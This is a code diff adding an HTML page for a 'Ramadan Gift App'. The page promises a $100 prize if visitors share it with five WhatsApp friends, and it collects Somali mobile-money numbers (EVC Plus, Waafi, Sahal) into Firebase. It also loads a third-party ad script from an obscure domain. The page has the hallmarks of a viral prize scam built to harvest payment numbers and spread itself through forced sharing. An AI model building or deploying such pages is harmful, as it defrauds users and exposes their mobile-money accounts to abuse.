@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src='//whephiwums.com/sdk.js' data-zone='8980914' data-sdk='show_8980914'></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Celebrate Ramadan with special gifts and surprises">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#2c3e50">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>Ramadan Gift App</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Welcome Popup -->
+        <div class="popup-overlay" id="welcomePopup">
+            <div class="popup-content">
+                <button class="popup-close" onclick="closeWelcomePopup()">&times;</button>
+                <h2 class="popup-title">Win $100 This Ramadan!</h2>
+                <p class="popup-text">Share with 5 friends on WhatsApp to claim your gift</p>
+                <button onclick="shareOnWhatsApp(); closeWelcomePopup();" class="popup-button whatsapp-btn">
+                    <i class="fab fa-whatsapp"></i>
+                    <span>Share on WhatsApp</span>
+                </button>
+            </div>
+        </div>
+        <div class="main-content">
+            <h1>Win $100 This Ramadan!</h1>
+            <div class="share-section top-share">
+                <p>Share with 5 friends on WhatsApp to claim your gift</p>
+                <button onclick="shareOnWhatsApp()" class="whatsapp-btn" aria-label="Share on WhatsApp">
+                    <i class="fab fa-whatsapp"></i>
+                    <span>Share on WhatsApp</span>
+                </button>
+            </div>
+
+            <div class="payment-input">
+                <div class="payment-select">
+                    <select id="paymentMethod" required aria-label="Payment method">
+                        <option value="evc">EVC Plus</option>
+                        <option value="waafi">Waafi</option>
+                        <option value="sahal">Sahal</option>
+                    </select>
+                </div>
+                <div class="phone-input">
+                    <span class="country-code">+252</span>
+                    <input type="tel" id="phoneNumber" placeholder="Enter your mobile money number" pattern="[0-9]{9}" required aria-label="Mobile money number">
+                </div>
+                <button onclick="verifyPhone()" id="startButton">
+                    <span class="button-text">Get Gift</span>
+                    <span class="loading-spinner hidden"></span>
+                </button>
+            </div>
+
+            <div class="gift-section" id="giftSection">
+                <h2>Click to Reveal Your Gifts</h2>
+                <div class="gifts-grid" id="giftsGrid">
+                    <!-- Gift boxes will be generated here -->
+                </div>
+            </div>
+
+            <div class="share-section bottom-share">
+                <p>Share with friends and family!</p>
+                <button onclick="shareOnFacebook()" class="facebook-btn" aria-label="Share on Facebook">
+                    <i class="fab fa-facebook-f"></i>
+                    <span>Share on Facebook</span>
+                </button>
+                <button onclick="shareOnTelegram()" class="telegram-btn" aria-label="Share on Telegram">
+                    <i class="fab fa-telegram-plane"></i>
+                    <span>Share on Telegram</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+    
+    <!-- App Scripts -->
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
